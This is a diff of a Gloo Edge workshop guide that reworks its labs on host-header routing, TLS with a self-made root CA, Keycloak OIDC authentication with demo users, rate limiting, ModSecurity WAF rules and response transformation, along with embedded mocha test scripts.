-describe("Productpage is available (plain http)", () => {
-  it('/productpage is available', () => helpers.checkURL({ host: 'http://' + process.env.ENDPOINT, path: '/productpage', retCode: 200 }));
+// ToDo update and check that both versions are returned v1 and v2
+describe("Echo Service is available using host header \"echo.solo.io\"", () => {
+  it('traffic routed to echo service when using the header "echo.solo.io"', () => 
+    helpers.checkURL({ host: 'http://echo.solo.io', retCode: 200 }));
 })
 
-describe("Productpage is available (plain http)", () => {
-  it('/not-secured/get is available', () => helpers.checkURL({ host: 'http://' + process.env.ENDPOINT, path: '/not-secured/get', retCode: 200 }));
+describe("httpbin receives requests that don't specify the host header", () => {
+  it('traffic routed to httpbin when no host specified', () => 
+    helpers.checkURL({ host: 'http://httpbin.solo.io', retCode: 200 }));
 })
+
 EOF
-mocha ./test.js --retries=500 2> /dev/null
+echo "executing test gloo-edge/templates/steps/traffic-management/tests/verify-routing.test.js.liquid"
+mocha ./test.js --retries=50 --bail 2> /dev/null || exit 1
 -->
+
 
 
 
 ## Lab 4 - Security and authentication <a name="Lab-4"></a>
 
-In this step, you will explore some Gloo Edge features related to security and Authentication. 
+
+
+In this step, you will explore some of the Gloo Edge features related to security and Authentication. 
 
 ### Network Encryption - Server TLS
 
-In this step you are going to secure your application using TLS.
+Traffic routes through many networking devices until it reaches the intended service. It is key for the traffic to be encrypted while traveling through these networking devices, and only the server should be able to decrypt and read the contents. For that reason you need to secure your application using TLS.
 
-Let's first create a private key and a self-signed certificate to use in your Virtual Service:
+Let's first create a private key and a self-signed certificate to be used in your virtual service:
+
+<!--bash
+  sudo rm -rf /etc/ssl/certs/root-ca.pem
+  sudo rm -rf /usr/local/share/ca-certificates/root-ca.crt 
+  sudo update-ca-certificates
+-->
 
 ```bash
-openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
-   -keyout tls.key -out tls.crt -subj "/CN=*"
+pushd $(mktemp -d)
+
+## Create Root CA
+step certificate create root-ca-edge root-ca.crt root-ca.key \
+  --profile root-ca --no-password --insecure --not-after 87600h --kty RSA
+
+## Create httpbin certificate
+step certificate create httpbin.solo.io tls.crt tls.key --ca root-ca.crt \
+    --ca-key root-ca.key --not-after 8760h --no-password --insecure \
+    --san httpbin.solo.io --kty RSA 
+
+# To fix CURL add the root ca to the system trusted CA's
+sudo cp root-ca.crt /usr/local/share/ca-certificates/
+sudo update-ca-certificates  
 ```
 
-Then, you have to store them in a Kubernetes secret running the following command:
+For chrome to trust the certificates signed by the root ca import it in the following location:
+
+Open chrome at the following path: chrome://settings/certificates
+Switch to 'Authorities' and Import the Root CA.
+
+For Gloo Edge to make use of the certificate and the private key we need to store those as Kubernetes Secrets using the following command:
 
 ```bash
 kubectl create secret tls upstream-tls --key tls.key \
    --cert tls.crt --namespace gloo-system
+
+popd
 ```
 
-To setup TLS you have to add the SSL config to the Virtual Service:
+With the secret created you have to update the virtual service to use it:
 
 ```bash
 kubectl apply -f - <<EOF
 apiVersion: gateway.solo.io/v1
 kind: VirtualService
 metadata:
-  name: demo
+  name: vs
   namespace: gloo-system
 spec:
 # ---------------- SSL config ---------------------------
@@ -688,11 +812,14 @@ spec:
       - '*'
     routes:
       - matchers:
-          - prefix: /not-secured
+        - prefix: /
+          headers:
+          - name: ":authority"
+            value: "echo.solo.io"
         delegateAction:
           selector:
             namespaces:
-              - team1
+              - echo
             labels:
               application-owner: team1
       - matchers:
@@ -700,103 +827,111 @@ spec:
         routeAction:
           single:
             upstream:
-              name: bookinfo-productpage-9080
+              name: httpbin-httpbin-8000
               namespace: gloo-system
 EOF
 ```
 
-Now the application is securely exposed through TLS. To test the TLS configuration, run the following command to open the browser (note that now the traffic is served using https): 
-
-```bash
-export APP_URL=https://${ENDPOINT}
+Now the application is securely exposed through TLS. Open it in the browser using https.
+```
+/opt/google/chrome/chrome https://httpbin.solo.io
 ```
 
-Let's check **bookinfo**:
+If you've added the Root CA certificate to your browser you will see the green key in the address bar, which indicates that the authentication of the server succeded and that the connection is encrypted and secure.
+
+Meanwhile, when you make requests using CURL, you either have to add the certificate to the system certs or specify it in the command as shown below.
 
 ```
-/opt/google/chrome/chrome $APP_URL/productpage 
+curl https://httpbin.solo.io/get
 ```
 
-The browser will warn you that your connection is not private due to the self-signed certificate.  Click through the `Advanced` button and the subsequent link to proceed to the "unsafe" destination.  Then the bookinfo interface should display as expected, although the address bar may continue to warn you that the destination is "Not Secure."  Don't worry; this is expected behavior given the self-signed certificate.
-
-![Self-Signed Certificate Warning](images/steps/security-and-authentication/self-signed-cert-error.png)
-
-And **httpbin**:
-
-> Since you are using self-signed certificates, you need to allow insecure server connection when using SSL with *-k*
-
-```
-curl -k $APP_URL/not-secured/get
-```
+Besides authenticating the server another important authentication is of the client (or end-user) before he is permitted to query information or make changes.
 
 <!--bash
 cat <<'EOF' > ./test.js
 const helpers = require('./tests/chai-http');
 
-describe("Productpage is available (https)", () => {
-  it('/productpage is available', () => helpers.checkURL({ host: process.env.APP_URL, path: '/productpage', retCode: 200 }));
+describe("httpbin is available (https)", () => {
+  it('is available', () => helpers.checkURL({ host: "https://httpbin.solo.io", retCode: 200 }));
 })
 
-describe("Productpage is available (https)", () => {
-  it('/not-secured/get is available', () => helpers.checkURL({ host: process.env.APP_URL, path: '/not-secured/get', retCode: 200 }));
-})
 EOF
-mocha ./test.js --retries=500 2> /dev/null
+echo "executing test gloo-edge/templates/steps/security-and-authentication/tests/https.test.js.liquid"
+mocha ./test.js --retries=50 --bail 2> /dev/null || exit 1
 -->
 
 ### Authentication with OIDC (OpenID Connect)
 
-In many use cases, you need to restrict the access to your applications to authenticated users. 
+In many use cases, you need to restrict the access to your applications to only authenticated users. 
 
 OIDC (OpenID Connect) is an identity layer on top of the OAuth 2.0 protocol. In OAuth 2.0 flows, authentication is performed by an external Identity Provider (IdP) which, in case of success, returns an Access Token representing the user identity. The protocol does not define the contents and structure of the Access Token, which greatly reduces the portability of OAuth 2.0 implementations.
 
 The goal of OIDC is to address this ambiguity by additionally requiring Identity Providers to return a well-defined ID Token. OIDC ID tokens follow the JSON Web Token standard and contain specific fields that your applications can expect and handle. This standardization allows you to switch between Identity Providers – or support multiple ones at the same time – with minimal, if any, changes to your downstream services; it also allows you to consistently apply additional security measures like Role-based Access Control (RBAC) based on the identity of your users, i.e. the contents of their ID token.
 
-In this step, you will secure the **bookinfo** application using an OIDC Identity Provider.
+In this step, you will secure the **httpbin** application using an OIDC Identity Provider.
 
 Let's start by installing Keycloak:
 
 ```bash
-kubectl create -f https://raw.githubusercontent.com/keycloak/keycloak-quickstarts/12.0.4/kubernetes-examples/keycloak.yaml
-kubectl rollout status deploy/keycloak
+kubectl create ns keycloak
+kubectl -n keycloak create -f https://git.io/Jyqye
+kubectl -n keycloak rollout status deploy/keycloak
 ```
 
-<!--bash
-sleep 30
--->
-
-Then, you need to configure it and create two users:
+Then, you need to configure it and create the following three users:
 
 - User1 credentials: `user1/password`
-  Email: user1@solo.io
+  Email: user1@acme.com
+  Subscription: Enterprise 
 
 - User2 credentials: `user2/password`
-  Email: user2@example.com
+  Email: user2@umbrella.com
+  Subscription: Free
 
-Let's create the users:
+- Administrator credentials: `admin1/password`
+  Email: admin1@solo.io
+
+To configure Keycloak we need to retrieve the Admin token:
 
 ```bash
 # Get Keycloak URL and token
-KEYCLOAK_URL=http://$(kubectl get service keycloak -o jsonpath='{.status.loadBalancer.ingress[0].ip}'):8080/auth
-KEYCLOAK_TOKEN=$(curl -d "client_id=admin-cli" -d "username=admin" -d "password=admin" -d "grant_type=password" "$KEYCLOAK_URL/realms/master/protocol/openid-connect/token" | jq -r .access_token)
+export KEYCLOAK_ENDPOINT=$(kubectl -n keycloak get service keycloak -o jsonpath='{.status.loadBalancer.ingress[0].*}')
+
+export KEYCLOAK_URL=http://${KEYCLOAK_ENDPOINT}:8080/auth
+
+## Wait for keycloak to be receiving requests
+timeout 60 bash -c "while ! echo exit | nc $KEYCLOAK_ENDPOINT 8080; do printf '.'; sleep 1; done"
+```
+
+And then we can make requests to Keycloak to configure the client and the users:
+
+```bash
+export KEYCLOAK_TOKEN=$(curl -d "client_id=admin-cli" -d "username=admin" -d "password=admin" -d "grant_type=password" "$KEYCLOAK_URL/realms/master/protocol/openid-connect/token" | jq -r .access_token)
+echo $KEYCLOAK_TOKEN
 
 # Create initial token to register the client
 read -r client token <<<$(curl -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -X POST -H "Content-Type: application/json" -d '{"expiration": 0, "count": 1}' $KEYCLOAK_URL/admin/realms/master/clients-initial-access | jq -r '[.id, .token] | @tsv')
 
 # Register the client
 read -r id secret <<<$(curl -X POST -d "{ \"clientId\": \"${client}\" }" -H "Content-Type:application/json" -H "Authorization: bearer ${token}" ${KEYCLOAK_URL}/realms/master/clients-registrations/default| jq -r '[.id, .secret] | @tsv')
-
 # Add allowed redirect URIs
-curl -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -X PUT -H "Content-Type: application/json" -d '{"serviceAccountsEnabled": true, "directAccessGrantsEnabled": true, "authorizationServicesEnabled": true, "redirectUris": ["'${APP_URL}'/callback", "http://portal.example.com/callback"]}' $KEYCLOAK_URL/admin/realms/master/clients/${id}
+curl -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -X PUT \
+  -H "Content-Type: application/json" -d "{\"serviceAccountsEnabled\": true, \"directAccessGrantsEnabled\": true, \"authorizationServicesEnabled\": true, \"redirectUris\": [\"https://httpbin.solo.io/callback\"]}" $KEYCLOAK_URL/admin/realms/master/clients/${id}
 
 # Add the group attribute in the JWT token returned by Keycloak
 curl -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -X POST -H "Content-Type: application/json" -d '{"name": "group", "protocol": "openid-connect", "protocolMapper": "oidc-usermodel-attribute-mapper", "config": {"claim.name": "group", "jsonType.label": "String", "user.attribute": "group", "id.token.claim": "true", "access.token.claim": "true"}}' $KEYCLOAK_URL/admin/realms/master/clients/${id}/protocol-mappers/models
 
-# Create first user
-curl -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -X POST -H "Content-Type: application/json" -d '{"username": "user1", "email": "user1@solo.io", "enabled": true, "attributes": {"group": "users"}, "credentials": [{"type": "password", "value": "password", "temporary": false}]}' $KEYCLOAK_URL/admin/realms/master/users
+# Add the subscription attribute in the JWT token returned by Keycloak
+curl -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -X POST -H "Content-Type: application/json" -d '{"name": "subscription", "protocol": "openid-connect", "protocolMapper": "oidc-usermodel-attribute-mapper", "config": {"claim.name": "subscription", "jsonType.label": "String", "user.attribute": "subscription", "id.token.claim": "true", "access.token.claim": "true"}}' $KEYCLOAK_URL/admin/realms/master/clients/${id}/protocol-mappers/models
 
-# Create second user
-curl -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -X POST -H "Content-Type: application/json" -d '{"username": "user2", "email": "user2@example.com", "enabled": true, "attributes": {"group": "users"}, "credentials": [{"type": "password", "value": "password", "temporary": false}]}' $KEYCLOAK_URL/admin/realms/master/users
+# Create regular user for ACME Corp.
+curl -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -X POST -H "Content-Type: application/json" -d '{"username": "user1", "email": "user1@acme.com", "enabled": true, "attributes": {"group": "users", "subscription": "enterprise"}, "credentials": [{"type": "password", "value": "password", "temporary": false}]}' $KEYCLOAK_URL/admin/realms/master/users
+
+# Create regular user for Umbrella Corp.
+curl -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -X POST -H "Content-Type: application/json" -d '{"username": "user2", "email": "user2@umbrella.com", "enabled": true, "attributes": {"group": "users", "subscription": "free"}, "credentials": [{"type": "password", "value": "password", "temporary": false}]}' $KEYCLOAK_URL/admin/realms/master/users
+
+# Create admin user
+curl -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -X POST -H "Content-Type: application/json" -d '{"username": "admin1", "email": "admin1@solo.io", "enabled": true, "attributes": {"group": "admin"}, "credentials": [{"type": "password", "value": "password", "temporary": false}]}' $KEYCLOAK_URL/admin/realms/master/users
 ```
 
 > **Note:** If you get a *Not Authorized* error, please, re-run this command and continue from the command started to fail:
@@ -805,13 +940,16 @@ curl -H "Authorization: Bearer ${KEYCLOAK_TOKEN}" -X POST -H "Content-Type: appl
 KEYCLOAK_TOKEN=$(curl -d "client_id=admin-cli" -d "username=admin" -d "password=admin" -d "grant_type=password" "$KEYCLOAK_URL/realms/master/protocol/openid-connect/token" | jq -r .access_token)
 ```
 
-The architecture looks like this now:
+The architecture looks like this now when omitting the `echo` services:
 
-![Bookinfo with OIDC](images/steps/security-and-authentication/bookinfo-oidc.png)
+![Bookinfo with OIDC](images/keycloak-oidc.png)
 
-The next step is to configure the authentication in the Virtual Service. For this, you will have to create a Kubernetes Secret that contains the OIDC secret:
+> **Note:** Another alternative to configure JWT authentication and authorization is explained here: https://docs.solo.io/gloo-edge/latest/guides/security/auth/jwt/access_control/#secure-the-virtual-service. This however, requires the client to provide the JWT token (and as well store it properly into an HttpOnly cookie)
+
+The next step is to configure the authentication in the virtual service. For this, you will have to create a Kubernetes Secret that contains the OIDC secret:
 
 ```bash
+echo $secret
 glooctl create secret oauth --namespace gloo-system --name oauth --client-secret ${secret}
 ```
 
@@ -828,7 +966,7 @@ spec:
   configs:
   - oauth2:
       oidcAuthorizationCode:
-        appUrl: ${APP_URL}
+        appUrl: https://httpbin.solo.io
         callbackPath: /callback
         clientId: ${client}
         clientSecretRef:
@@ -842,66 +980,62 @@ spec:
 EOF
 ```
 
-Finally you activate the authentication on the Virtual Service by referencing the AuthConfig:
+Finally, activate the authentication on the virtual service by referencing the AuthConfig:
 
-> Notice that this only applies to a specific route, because it is configured within a **matcher**
+> Notice that this only applies to httpbin, because it is configured within a **matcher**
 
 ```bash
 kubectl apply -f - <<EOF
 apiVersion: gateway.solo.io/v1
 kind: VirtualService
 metadata:
-  name: demo
+  name: vs
   namespace: gloo-system
 spec:
   sslConfig:
     secretRef:
       name: upstream-tls
-      namespace: gloo-system  
+      namespace: gloo-system
   virtualHost:
     domains:
       - '*'
     routes:
       - matchers:
-          - prefix: /not-secured
+        - prefix: /
+          headers:
+          - name: ":authority"
+            value: "echo.solo.io"
         delegateAction:
           selector:
             namespaces:
-              - team1
+              - echo
             labels:
               application-owner: team1
       - matchers:
           - prefix: /
-# ------------------- OIDC - Only applied to this matcher -------------------
+        routeAction:
+          single:
+            upstream:
+              name: httpbin-httpbin-8000
+              namespace: gloo-system
         options:
           extauth:
             configRef:
               name: oauth
               namespace: gloo-system
-# ---------------------------------------------------------------------------
-        routeAction:
-          single:
-            upstream:
-              name: bookinfo-productpage-9080
-              namespace: gloo-system
 EOF
 ```
 
-To test the Authentication, try first to access the **httpbin** application. You will see that Authentication is NOT required.
-
+If you refresh the web browser for the **httpbin** application, you will be redirected to the authentication challenge. If you have closed the window open a new one:
 ```
-curl -k $APP_URL/not-secured/get
-```
-
-On the other hand, if you refresh the web browser for the **bookinfo** application, you will be redirected to the authentication challenge.
-
-```
-/opt/google/chrome/chrome $APP_URL/productpage 
+/opt/google/chrome/chrome https://httpbin.solo.io/ 
 ```
 
-If you use username: `user1` and password: `password` Gloo should redirect you back to the **bookinfo** application.
+After authenticating with the username: `user1` and password: `password` Gloo will redirect you back to the **httpbin** application.
 
-![Keycloak Authentication Dialog](images/steps/security-and-authentication/keycloak-authentication-dialog.png)
+![Keycloak Authentication Dialog](images/keycloak-authentication-dialog.png)
+
+After authenticating the user we can determine what he is authorized to access. We will investigate that right after we refactor the current resources some bit.
 
 <!--bash
 cat <<'EOF' > ./test.js
@@ -910,742 +1044,142 @@ const helpersHttp = require('./tests/chai-http');
 var chai = require('chai');
 var expect = chai.expect;
 
-describe("Productpage is requiring authentication", () => {
-  it('/productpage is available', () => helpersHttp.checkURL({ host: process.env.APP_URL, path: '/productpage', retCode: 302 }));
+describe("httpbin requires authentication", () => {
+  it('redirect code received', () => helpersHttp.checkURL({ host: "https://httpbin.solo.io/", retCode: 302 }));
 })
 
 describe("Authentication is working properly", function() {
   let user = 'user1';
   let password = 'password';
-  let keycloak_svc = chaiExec("kubectl get service keycloak -o jsonpath='{.status.loadBalancer.ingress[0].ip}'").stdout.replaceAll("'", "");
+  let keycloak_svc = chaiExec("kubectl -n keycloak get service keycloak -o jsonpath='{.status.loadBalancer.ingress[0].ip}'").stdout.replaceAll("'", "");
   let keycloak_client_id = chaiExec("kubectl -n gloo-system get authconfig oauth -o jsonpath='{.spec.configs[0].oauth2.oidcAuthorizationCode.clientId}'").stdout.replaceAll("'", "");
   let keycloak_client_secret_base64 = chaiExec("kubectl -n gloo-system get secret oauth -o jsonpath='{.data.oauth}'").stdout.replaceAll("'", "");
   let buff = new Buffer(keycloak_client_secret_base64, 'base64');
   let keycloak_client_secret = buff.toString('ascii').split(' ')[1].trim();
   let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "http://' + keycloak_svc + ':8080/auth/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
-  it('/productpage is available with authentication', () => helpersHttp.checkURL({ host: process.env.APP_URL, path: '/productpage', headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], retCode: 200 }));
+  it('httpbin is accessible after authenticating', () => helpersHttp.checkURL({ host: "https://httpbin.solo.io/", headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], retCode: 200 }));
 });
 EOF
-mocha ./test.js --retries=500 2> /dev/null
+echo "executing test gloo-edge/templates/steps/security-and-authentication/tests/authentication.test.js.liquid"
+mocha ./test.js --retries=50 --bail 2> /dev/null || exit 1
 -->
 
+### Refactor time
 
+If we configure one Virtual Service with all the hostnames and all the routing information it will quickly grow to a point that it is untenable.
 
-## Lab 5 - Rate limiting <a name="Lab-5"></a>
+A very simple rule to adhere to when creating Virtual Services is to create one virtual service per hostname or related group of hostnames that share a common configuration. 
+In our instance the `httpbin` and the `echo` service don't share anything in common, so we can break this into two Virtual Services, one for each service.
 
-In this step, you are going to use rate limiting to protect only **bookinfo** applications.
-
-To enable rate limiting on your Virtual Service, you will first create a RateLimitConfig resource:
+Start by cleaning up the current virtual service.
 
 ```bash
-kubectl apply -f - << EOF
-apiVersion: ratelimit.solo.io/v1alpha1
-kind: RateLimitConfig
-metadata:
-  name: global-limit
-  namespace: gloo-system
-spec:
-  raw:
-    descriptors:
-    - key: generic_key
-      value: count
-      rateLimit:
-        requestsPerUnit: 10
-        unit: MINUTE
-    rateLimits:
-    - actions:
-      - genericKey:
-          descriptorValue: count
-EOF
+kubectl delete virtualservice vs -n gloo-system
 ```
 
-Now let's update your Virtual Service to use the **bookinfo** application with the new rate limit enforced. The changes affect only one **matcher** (the one for **bookinfo**):
+Next create one virtual service to represent each hostname. Start with the echo service.
 
 ```bash
 kubectl apply -f - <<EOF
 apiVersion: gateway.solo.io/v1
 kind: VirtualService
 metadata:
-  name: demo
+  name: vs-echo
   namespace: gloo-system
 spec:
-  sslConfig:
-    secretRef:
-      name: upstream-tls
-      namespace: gloo-system  
   virtualHost:
     domains:
-      - '*'
+      - 'echo.solo.io'
     routes:
       - matchers:
-          - prefix: /not-secured
+        - prefix: /
         delegateAction:
           selector:
             namespaces:
-              - team1
+              - echo
             labels:
               application-owner: team1
-      - matchers:
-          - prefix: /
-        options:
-          extauth:
-            configRef:
-              name: oauth
-              namespace: gloo-system
-# ---------------- Rate limit config ------------------
-          rateLimitConfigs:
-            refs:
-            - name: global-limit
-              namespace: gloo-system
-#------------------------------------------------------
-        routeAction:
-          single:
-            upstream:
-              name: bookinfo-productpage-9080
-              namespace: gloo-system
 EOF
 ```
 
-To test rate limiting, refresh the browser until you see a 429 message. 
-
-![Browser 429 Too Many Requests Interface](images/steps/rate-limiting/429.png)
-
-```
-/opt/google/chrome/chrome $APP_URL/productpage 
-```
-
-<!--bash
-cat <<'EOF' > ./test.js
-const chaiExec = require("@jsdevtools/chai-exec");
-const helpersHttp = require('./tests/chai-http');
-var chai = require('chai');
-var expect = chai.expect;
-
-describe("Authenticated user is rate limited", function() {
-  let user = 'user1';
-  let password = 'password';
-  let keycloak_svc = chaiExec("kubectl get service keycloak -o jsonpath='{.status.loadBalancer.ingress[0].ip}'").stdout.replaceAll("'", "");
-  let keycloak_client_id = chaiExec("kubectl -n gloo-system get authconfig oauth -o jsonpath='{.spec.configs[0].oauth2.oidcAuthorizationCode.clientId}'").stdout.replaceAll("'", "");
-  let keycloak_client_secret_base64 = chaiExec("kubectl -n gloo-system get secret oauth -o jsonpath='{.data.oauth}'").stdout.replaceAll("'", "");
-  let buff = new Buffer(keycloak_client_secret_base64, 'base64');
-  let keycloak_client_secret = buff.toString('ascii').split(' ')[1].trim();
-  let keycloak_token = JSON.parse(chaiExec('curl -d "client_id=' + keycloak_client_id + '" -d "client_secret=' + keycloak_client_secret + '" -d "scope=openid" -d "username=' + user + '" -d "password=' + password + '" -d "grant_type=password" "http://' + keycloak_svc + ':8080/auth/realms/master/protocol/openid-connect/token"').stdout.replaceAll("'", "")).id_token;
-  it('/productpage is is rate limited', () => helpersHttp.checkURL({ host: process.env.APP_URL, path: '/productpage', headers: [{key: 'Authorization', value: 'Bearer ' + keycloak_token}], retCode: 429 }));
-});
-EOF
-mocha ./test.js --retries=500 2> /dev/null
--->
-
-### Different Rate Limiting For Authenticated And Anonymous Users
-
-Following example of Rate Limit shows how you can specify different rate limiting for Authenticated users and for Anonymous users.
-
-First, let's delete the Rate Limit Configuration you have created before:
-
-```bash
-kubectl delete ratelimitconfig global-limit -n gloo-system
-```
-
-And now, let's update your Virtual Service to add the Rate Limit Configuration directly in the Virtual Service resource:
+And proceed to create the virtual service for httpbin.
 
 ```bash
 kubectl apply -f - <<EOF
 apiVersion: gateway.solo.io/v1
 kind: VirtualService
 metadata:
-  name: demo
+  name: vs-httpbin
   namespace: gloo-system
 spec:
   sslConfig:
     secretRef:
       name: upstream-tls
-      namespace: gloo-system  
+      namespace: gloo-system
   virtualHost:
     domains:
-      - '*'
-    options:
-# -------- Rate limit config by authenticated and anonymous -------
-      ratelimitBasic:
-        anonymousLimits:
-          requestsPerUnit: 5
-          unit: MINUTE
-        authorizedLimits:
-          requestsPerUnit: 20
-          unit: MINUTE
-# -----------------------------------------------------------------
+      - 'httpbin.solo.io'
     routes:
       - matchers:
-          - prefix: /not-secured
-        delegateAction:
-          selector:
-            namespaces:
-              - team1
-            labels:
-              application-owner: team1
-      - matchers:
           - prefix: /
-        options:
-          extauth:
-            configRef:
-              name: oauth
-              namespace: gloo-system
         routeAction:
           single:
             upstream:
-              name: bookinfo-productpage-9080
+              name: httpbin-httpbin-8000
               namespace: gloo-system
-EOF
-```
-
-Access the **httpbin** application 10 times. After reaching the Rate Limit, you will retrieve a **429 error**. This is because you are an anonymous user in that application.
-
-```
-for i in {1..10}
-do
-curl -k -s -o /dev/null -w "%{http_code}" $(glooctl proxy url --port https)/not-secured/get; echo
-done
-```
-
-Now, try it with the **bookinfo** application, and the number of requests will be limited to 20 as you are an Authenticated user. 
-
-> Notice that the requests for static content also count since they share the route `/`.
-> `/productpage`
-> `/static/`
-
-```
-/opt/google/chrome/chrome $(glooctl proxy url --port https)/productpage
-```
-
-<!--bash
-cat <<'EOF' > ./test.js
-const helpers = require('./tests/chai-http');
-
-describe("Anonymous user is rate limited", () => {
-  it('/not-secured/get is rate limited', () => helpers.checkURL({ host: process.env.APP_URL, path: '/not-secured/get', retCode: 429 }));
-})
-EOF
-mocha ./test.js --retries=500 2> /dev/null
--->
-
-
-
-## Lab 6 - Web application firewall <a name="Lab-6"></a>
-
-A web application firewall (WAF) protects web applications by monitoring, filtering and blocking potentially harmful traffic and attacks that can overtake or exploit them.
-
-Gloo Edge Enterprise includes the ability to enable the ModSecurity Web Application Firewall for any incoming and outgoing HTTP connections. 
-
-Let's update the Virtual Service to restrict requests with huge payloads to avoid *Large Payload Post DDoS Attacks*. The intention of this DDoS attack is abuse of the amount of memory used to decode the payload bringing the server down.
-
-```bash
-kubectl apply -f - <<EOF
-apiVersion: gateway.solo.io/v1
-kind: VirtualService
-metadata:
-  name: demo
-  namespace: gloo-system
-spec:
-  sslConfig:
-    secretRef:
-      name: upstream-tls
-      namespace: gloo-system  
-  virtualHost:
-    domains:
-      - '*'
     options:
-# ---------------- Web Application Firewall -----------
-      waf:
-        customInterventionMessage: "Payload sizes above 1KB not allowed"
-        ruleSets:
-        - ruleStr: |
-            SecRuleEngine On
-            SecRequestBodyLimit 1
-            SecRequestBodyLimitAction Reject
-#------------------------------------------------------
-    routes:
-      - matchers:
-          - prefix: /not-secured
-        delegateAction:
-          selector:
-            namespaces:
-              - team1
-            labels:
-              application-owner: team1
-      - matchers:
-          - prefix: /
-        options:
-          extauth:
-            configRef:
-              name: oauth
-              namespace: gloo-system
-        routeAction:
-          single:
-            upstream:
-              name: bookinfo-productpage-9080
-              namespace: gloo-system
-EOF
-```
-
-The rule means that the request body size cannot be greater than 1KB.
-
-Run following command to test it:
-
-```
-curl -k $(glooctl proxy url --port https)/not-secured/post -d "<note><heading>Reminder</heading><body>are you sure this is a huge payload???</body></note>" -H "Content-Type: application/xml"
-```
-
-You should get the following error message:
-
-```
-Payload sizes above 1KB not allowed
-```
-
-<!--bash
-cat <<'EOF' > ./test.js
-var chai = require('chai');
-var expect = chai.expect;
-const chaiHttp = require("chai-http");
-chai.use(chaiHttp);
-
-process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
-
-let searchTest="Payload sizes above 1KB not allowed";
-
-describe("Request should be blocked due to the body size", () => {
-  it("Request is blocked", async () => {
-    await chai.request(process.env.APP_URL)
-      .post('/not-secured/post')
-      .send("<note><heading>Reminder</heading><body>are you sure this is a huge payload???</body></note>")
-      .then((res) => {
-        expect(res.text).to.contain(searchTest);
-      });
-  });
-});
-
-EOF
-mocha ./test.js --retries=500 2> /dev/null
--->
-
-#### WAF Blocks well-known harmful User-Agents
-
-Another kind of attack is done by some recognized User-Agents.
-
-In this step, you will block `scammer`:
-
-```bash
-kubectl apply -f - <<EOF
-apiVersion: gateway.solo.io/v1
-kind: VirtualService
-metadata:
-  name: demo
-  namespace: gloo-system
-spec:
-  sslConfig:
-    secretRef:
-      name: upstream-tls
-      namespace: gloo-system  
-  virtualHost:
-    domains:
-      - '*'
-    options:
-# -------- Web Application Firewall - Check User-Agent  -----------
-      waf:
-        customInterventionMessage: "Blocked Scammer"
-        ruleSets:
-        - ruleStr: |
-            SecRuleEngine On
-            SecRule REQUEST_HEADERS:User-Agent "scammer" "deny,status:403,id:107,phase:1,msg:'blocked scammer'"
-#-------------------------------------------------------------------
-    routes:
-      - matchers:
-          - prefix: /not-secured
-        delegateAction:
-          selector:
-            namespaces:
-              - team1
-            labels:
-              application-owner: team1
-      - matchers:
-          - prefix: /
-        options:
-          extauth:
-            configRef:
-              name: oauth
-              namespace: gloo-system
-        routeAction:
-          single:
-            upstream:
-              name: bookinfo-productpage-9080
-              namespace: gloo-system
-EOF
-```
-
-The rule means a well known `scammer` User-Agent will be blocked.
-
-Run following command to test it:
-
-```
-curl -k $(glooctl proxy url --port https)/not-secured/get -H "Content-Type: application/xml" -H 'User-Agent: scammer'
-```
-
-You should get the following error message:
-
-```
-Blocked Scammer
-```
-
-<!--bash
-cat <<'EOF' > ./test.js
-const helpers = require('./tests/chai-http');
-
-describe("Request should be blocked due to the scammer user-agent header", () => {
-  it('Request is blocked', () => helpers.checkBody({ host: process.env.APP_URL, path: '/not-secured/get', headers: [{key: 'User-Agent', value: 'scammer'}], body: 'Blocked Scammer', match: true }));
-})
-EOF
-mocha ./test.js --retries=500 2> /dev/null
--->
-
-
-
-## Lab 7 - Data transformation <a name="Lab-7"></a>
-
-In this section you will explore how to transform requests and responses using Gloo Edge.
-
-### Response Transformation
-
-Before, it was mentioned that **httpbin** is a good tool to debug and test things out. In this section, you will use that application to easily spot the results.
-
-Following example demonstrates how to modify a response using Gloo Edge. You are going to return a basic html page when the response code is 429 (rate limited).  
-
-
-```bash
-kubectl apply -f - <<EOF
-apiVersion: gateway.solo.io/v1
-kind: RouteTable
-metadata:
-  name: httpbin-routetable
-  namespace: team1
-  labels:
-    application-owner: team1
-spec:
-  routes:
-# -------- Rate limit at route level requires to give a name -------
-    - name: "not-secured"
-# ------------------------------------------------------------------
-      matchers:
-        - prefix: /not-secured
-      options:
-        prefixRewrite: '/'
-# -------- Rate limit as you saw before ------------
-        ratelimitBasic:
-          anonymousLimits:
-            requestsPerUnit: 5
-            unit: MINUTE
-# --------------------------------------------------
-# ---------------- Transformation ------------------          
-        transformations:
-          responseTransformation:
-            transformationTemplate:
-              parseBodyBehavior: DontParse
-              body: 
-                text: '{% if header(":status") == "429" %}<html><body style="background-color:powderblue;"><h1>Too many Requests!</h1><p>Try again after 1 minute</p></body></html>{% else %}{{ body() }}{% endif %}'
-#---------------------------------------------------
-      routeAction:
-          single:
-            upstream:
-              name: team1-httpbin-8000
-              namespace: gloo-system
-EOF
-```
-
-
-Refreshing your browser more than 5 times, you should be able to see a styled HTML page indicating that you have reached the limit you had configured before. 
-
-```
-/opt/google/chrome/chrome $(glooctl proxy url --port https)/not-secured/get
-```
-
-<!--bash
-cat <<'EOF' > ./test.js
-const helpers = require('./tests/chai-http');
-
-describe("httpbin should return the expected body", () => {
-  it('httpbin returns the transformed body', () => helpers.checkBody({ host: process.env.APP_URL, path: '/not-secured/get', body: 'Too many Requests!', match: true }));
-})
-EOF
-mocha ./test.js --retries=500 2> /dev/null
--->
-
-### Manipulate the response when a 401 Not Authorized is returned
-
-The following example shows how to create a transformation which modifies the body when the error code is 401 Not Authorized.
-
